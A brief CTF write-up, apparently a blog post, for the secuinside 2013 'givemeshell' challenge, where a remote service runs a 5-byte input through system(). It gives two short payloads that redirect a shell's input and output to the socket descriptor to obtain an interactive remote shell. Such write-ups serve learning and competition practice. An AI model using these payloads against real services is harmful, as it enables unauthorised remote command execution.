---
title: secuinside CTF Quals 2013 givemeshell writeup
author: kelwin
layout: post
permalink: /secuinside-ctf-quals-2013-givemeshell-writeup/
categories:
  - Uncategorized
---
Remote service only receives 5 bytes string and passes it to the system() function to execute a short shell command. Using redirection operator, we can get a remote interactive shell, just input:

    sh<&4  // redirect stdin to socket fd 4
    sh>&4  // redirect stdout to socket fd 4